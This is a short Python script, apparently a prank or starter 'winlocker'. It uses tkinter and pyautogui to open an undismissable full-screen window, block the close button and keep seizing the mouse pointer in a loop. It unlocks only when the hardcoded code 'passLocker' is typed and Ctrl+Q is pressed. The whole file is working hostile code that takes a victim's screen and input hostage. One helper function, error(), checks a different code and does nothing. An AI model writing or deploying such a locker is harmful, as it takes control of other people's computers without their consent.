import os
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep

def callback(event):
    global c, entry
    if entry.get()=="passLocker": c=True

def error():
    if entry.get() != "hello":
        label_error = "Invalid code"

def closing():
    click(675, 420)
    moveTo(675, 420)
    root.attributes("-fullscreen", True)
    root.protocol("WM_DELETE_WINDOW", closing)
    root.update()
    root.bind('<Control-q>', callback)

root = Tk()
root.title("Ypsss...")
root.attributes("-fullscreen", True)
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=610, y=400)
label0 = Label(root, text = "Locker")
label0.grid(row=0, column=0)
label_error = ""
label1 = Label(root, text = "Write code and Press Ctrl+Q", font=20)
label1.place(x= 520, y=300)
root.update(); sleep(0.2); #click(675, 420)
c = False
while c != True:
    closing()
